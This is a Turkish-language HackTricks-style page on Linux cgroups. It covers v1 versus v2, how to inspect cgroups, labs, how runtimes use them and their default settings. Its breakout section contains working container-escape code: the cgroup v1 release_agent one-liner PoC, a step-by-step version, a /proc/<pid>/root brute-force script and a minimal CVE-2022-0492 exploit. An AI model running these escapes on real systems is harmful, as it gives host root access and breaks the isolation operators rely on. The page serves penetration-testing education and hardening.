# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

Linux **kontrol grupları**, süreçleri muhasebe, sınırlama, önceliklendirme ve politika uygulama amaçlarıyla bir araya getirmek için kullanılan kernel mekanizmasıdır. Eğer namespaces öncelikle kaynakların görünümünü izole etmekle ilgiliyse, cgroups esasen bir süreç grubunun bu kaynakların ne kadarını tüketebileceğini ve bazı durumlarda hangi kaynak sınıflarıyla etkileşime girebileceğini düzenlemeyle ilgilidir. Container'lar, kullanıcı doğrudan onlara bakmasa bile sürekli olarak cgroups'a güvenir; çünkü neredeyse her modern runtime, kernela "bu süreçler bu workload'a ait ve bunlar onlara uygulanan kaynak kurallarıdır" diyebilmenin bir yoluna ihtiyaç duyar.

İşte bu yüzden container motorları yeni bir container'ı kendi cgroup alt ağacına yerleştirir. Süreç ağacı orada olduğunda, runtime bellek sınırı koyabilir, PID sayısını sınırlayabilir, CPU kullanımına ağırlık verebilir, I/O'yu düzenleyebilir ve cihaz erişimini kısıtlayabilir. Üretim ortamında bu, hem çoklu kiracı güvenliği hem de basit operasyonel hijyen için esastır. Anlamlı kaynak kontrolleri olmayan bir container bellek tüketimini bitirebilir, sistemi süreçlerle doldurabilir veya hostu ya da komşu workload'ları kararsız hale getirecek şekilde CPU ve I/O'yu tekelinde tutabilir.

Güvenlik açısından cgroups iki ayrı şekilde önem taşır. Birincisi, kötü veya eksik kaynak limitleri doğrudan denial-of-service saldırılarına olanak tanır. İkincisi, bazı cgroup özellikleri, özellikle eski **cgroup v1** kurulumlarında, konteyner içinden yazılabilir olduklarında tarihsel olarak güçlü breakout primitive'leri yaratmıştır.

## v1 Vs v2

Sahada iki ana cgroup modeli vardır. **cgroup v1** birden fazla controller hiyerarşisini ortaya koyar ve eski exploit yazımları genellikle oradaki garip ve bazen aşırı güçlü semantikler etrafında döner. **cgroup v2** daha birleşik bir hiyerarşi ve genel olarak daha temiz davranış getirir. Modern dağıtımlar giderek cgroup v2'yi tercih etmekle birlikte, karma veya eski ortamlar hâlâ mevcuttur; bu da gerçek sistemleri incelerken her iki modelin de alakalı olduğu anlamına gelir.

Fark önemlidir çünkü container breakout ile ilgili en ünlü hikayelerden bazıları, örneğin cgroup v1'de **`release_agent`** istismarı gibi, çok özel olarak eski cgroup davranışlarına bağlıdır. Bir okuyucu bir blogda cgroup exploit'i görüp bunu körü körüne modern, yalnızca cgroup v2 olan bir sisteme uygularsa hedefte gerçekten nelerin mümkün olduğunu yanlış anlayabilir.

## İnceleme

Mevcut shell'inizin nerede olduğunu görmek için en hızlı yol:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` dosyası, mevcut süreçle ilişkili cgroup yollarını gösterir. Modern bir cgroup v2 makinesinde genellikle birleşik bir giriş görürsünüz. Daha eski veya hibrit makinelerde birden fazla v1 controller yolunu görebilirsiniz. Yolu öğrendikten sonra, limitleri ve mevcut kullanımı görmek için `/sys/fs/cgroup` altındaki ilgili dosyaları inceleyebilirsiniz.

On a cgroup v2 host, the following commands are useful:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Bu dosyalar hangi controller'ların mevcut olduğunu ve hangilerinin child cgroups'a devredildiğini ortaya koyar. Bu delege etme modeli rootless ve systemd-managed ortamlarda önemlidir; çünkü runtime, üst hiyerarşinin gerçekten devrettiği cgroup işlevselliğinin yalnızca bir alt kümesini kontrol edebiliyor olabilir.

## Lab

cgroups'ları uygulamada gözlemlemenin bir yolu, belleği sınırlı bir container çalıştırmaktır:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Ayrıca PID sınırlı bir container deneyebilirsiniz:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Bu örnekler yararlıdır çünkü runtime bayrağını kernel dosya arayüzüne bağlamaya yardımcı olurlar. Runtime kuralı sihirle uygulamıyor; ilgili cgroup ayarlarını yazıyor ve ardından kernel'in bu ayarları işlem ağacına karşı uygulamasına izin veriyor.

## Runtime Kullanımı

Docker, Podman, containerd ve CRI-O normal işletimlerinin bir parçası olarak cgroups'a güvenir. Farklılıklar genellikle cgroups kullanıp kullanmadıklarıyla ilgili değil; daha çok **hangi varsayılanları seçtikleri**, **systemd ile nasıl etkileştikleri**, **rootless delegation'ın nasıl işlediği** ve **yapılandırmanın ne kadarının engine seviyesinde vs. orkestrasyon seviyesinde kontrol edildiği** ile ilgilidir.

Kubernetes'te resource requests ve limits eninde sonunda node üzerindeki cgroup yapılandırmasına dönüşür. Pod YAML'dan kernel uygulamasına giden yol kubelet, CRI runtime ve OCI runtime üzerinden geçer, fakat kuralı nihai olarak uygulayan mekanizma hâlâ cgroups'tur. Incus/LXC ortamlarında da cgroups yoğun şekilde kullanılır; özellikle system containers genellikle daha zengin bir işlem ağacı ve daha VM-benzeri işletim beklentileri sunduğu için.

## Misconfigurations And Breakouts

Klasik cgroup güvenlik hikayesi yazılabilir **cgroup v1 `release_agent`** mekanizmasıdır. Bu modelde, eğer bir saldırgan doğru cgroup dosyalarına yazabiliyor, `notify_on_release`'ı etkinleştirebiliyor ve `release_agent`'te saklanan yolu kontrol edebiliyorsa, cgroup boşaldığında kernel host üzerindeki **initial namespaces** içinde saldırganın seçtiği yolu çalıştırabilir. Bu yüzden eski yazılarda cgroup kontrolörünün yazılabilirliği, mount seçenekleri ve namespace/capability koşullarına çok fazla dikkat edilir.

`release_agent` kullanılamasa bile cgroup hataları önemlidir. Aşırı geniş cihaz erişimi container'dan host cihazlarına ulaşılmasını sağlayabilir. Eksik memory ve PID limitleri basit bir kod yürütmesini host DoS'a dönüştürebilir. Rootless senaryolarda zayıf cgroup delege etme, runtime aslında bunu uygulayamamış olsa bile savunucuları bir kısıtlama varmış gibi yanıltabilir.

### `release_agent` Background

`release_agent` tekniği yalnızca **cgroup v1** için geçerlidir. Temel fikir şudur: bir cgroup içindeki son süreç çıktığında ve `notify_on_release=1` ayarlıysa, kernel `release_agent` içinde saklanan yolu işaret eden programı çalıştırır. Bu yürütme **host üzerindeki initial namespaces** içinde gerçekleşir; bu da yazılabilir bir `release_agent`'ı container escape primitive'ine dönüştürür.

Tekniğin çalışması için saldırganın genellikle ihtiyacı olanlar:

- yazılabilir bir **cgroup v1** hiyerarşisi
- bir child cgroup oluşturma veya kullanma yeteneği
- `notify_on_release`'ı ayarlama yeteneği
- `release_agent` içine bir yol yazma yeteneği
- host açısından yürütülebilir bir dosyaya çözümlenen bir yol

### Klasik PoC

Tarihi tek satırlık PoC şudur:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Bu PoC, `release_agent` içine bir payload path yazar, cgroup release tetikler ve ardından host üzerinde oluşturulan çıktı dosyasını geri okur.

### Okunabilir Adım Adım Anlatım

Aynı fikir adımlara ayrıldığında anlaması daha kolaydır.

1. Yazılabilir bir cgroup oluşturun ve hazırlayın:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. container filesystem'e karşılık gelen host yolunu belirleyin:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Host path'ten görünür olacak bir payload bırakın:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. cgroup'u boş bırakarak yürütmeyi tetikleyin:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Etki, payload'ın host tarafında root ayrıcalıklarıyla çalıştırılmasıdır. Gerçek bir exploit'te payload genellikle bir proof file yazar, bir reverse shell başlatır veya host durumunu değiştirir.

### Göreli Yol Varyantı `/proc/<pid>/root` Kullanımı

Bazı ortamlarda, host'un container filesystem'e olan yolu belirgin olmayabilir veya storage driver tarafından gizlenmiş olabilir. Bu durumda payload yolu `/proc/<pid>/root/...` üzerinden ifade edilebilir; burada `<pid>` mevcut container içindeki bir süreçe ait host PID'sidir. Bu, relative-path brute-force varyantının temelidir:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Buradaki ilgili hile kaba kuvvetin kendisi değil, yol biçimidir: `/proc/<pid>/root/...` kernel'in, doğrudan host depolama yolu önceden bilinmese bile, host namespace'inden container dosya sistemindeki bir dosyayı çözmesine izin verir.

### CVE-2022-0492 Varyantı

2022'de CVE-2022-0492, cgroup v1'de `release_agent`'e yazmanın **initial** user namespace içinde `CAP_SYS_ADMIN`'i doğru şekilde kontrol etmediğini gösterdi. Bu, tekniği savunmasız kernel'lerde çok daha erişilebilir hale getirdi çünkü bir container süreci bir cgroup hiyerarşisini mount edebiliyorsa, host user namespace'te zaten ayrıcalıklı olmadan `release_agent`'e yazabiliyordu.

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Zafiyetli bir kernelde host, `/proc/self/exe`'yi host root ayrıcalıklarıyla çalıştırır.

Pratik istismar için, ortamdaki yazılabilir cgroup-v1 yollarının veya tehlikeli cihaz erişiminin hâlâ açığa çıkıp çıkmadığını kontrol etmeye başlayın:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Eğer `release_agent` mevcut ve yazılabilir durumdaysa, zaten legacy-breakout alanındasınız:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Eğer cgroup path kendisi bir escape sağlamıyorsa, sonraki pratik kullanım genellikle denial of service veya reconnaissance olur:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Bu komutlar, işyükünün fork-bomb yapmaya, belleği agresifçe tüketmeye veya yazılabilir eski bir cgroup arayüzünü kötüye kullanmaya imkânı olup olmadığını hızlıca söyler.

## Kontroller

Hedefi incelerken, cgroup kontrollerinin amacı hangi cgroup modelinin kullanıldığını, container'ın yazılabilir controller yollarını görüp görmediğini ve `release_agent` gibi eski breakout primitives'in bile ilgili olup olmadığını öğrenmektir.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
What is interesting here:

- Eğer `mount | grep cgroup` **cgroup v1** gösteriyorsa, daha eski breakout writeups daha ilgili hale gelir.
- Eğer `release_agent` mevcut ve erişilebilir ise, bu derinlemesine incelemeye değer.
- Görünen cgroup hiyerarşisi yazılabilir durumdaysa ve container ayrıca güçlü capabilities'e sahipse, ortam daha yakından incelenmelidir.

Eğer **cgroup v1**, yazılabilir controller mount'ları ve ayrıca güçlü capabilities'e sahip ya da zayıf seccomp/AppArmor koruması bulunan bir container keşfederseniz, bu bileşim dikkatle incelenmeyi hak eder. cgroups genellikle sıkıcı bir kaynak yönetimi konusu olarak görülür, ancak tarihsel olarak en öğretici container escape zincirlerinin bir parçası olmuşlardır; bunun nedeni "kaynak kontrolü" ile "host etkisi" arasındaki sınırın insanların sandığı kadar temiz olmamasıdır.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak etkin | Container'lar otomatik olarak cgroups içine yerleştirilir; kaynak sınırları bayraklarla ayarlanmadıkça isteğe bağlıdır | `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight` gibi bayrakların kullanılmaması; `--device`; `--privileged` |
| Podman | Varsayılan olarak etkin | `--cgroups=enabled` varsayılandır; cgroup namespace varsayılanları cgroup sürümüne göre değişir (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, cihaz erişiminin gevşetilmesi, `--privileged` |
| Kubernetes | Varsayılan olarak runtime üzerinden etkinleştirilir | Pods ve container'lar node runtime tarafından cgroups içine yerleştirilir; ince taneli kaynak kontrolü `resources.requests` / `resources.limits`'e bağlıdır | kaynak istekleri/sınırlarının atlanması, ayrıcalıklı cihaz erişimi, host seviyesinde runtime yanlış yapılandırması |
| containerd / CRI-O | Varsayılan olarak etkin | cgroups normal yaşam döngüsü yönetiminin parçasıdır | cihaz kontrollerini gevşeten veya eski yazılabilir cgroup v1 arayüzlerini açığa çıkaran doğrudan runtime konfigürasyonları |

Önemli ayrım şudur: **cgroup existence** genelde varsayılandır, oysa **useful resource constraints** çoğunlukla açıkça yapılandırılmadıkça isteğe bağlıdır.
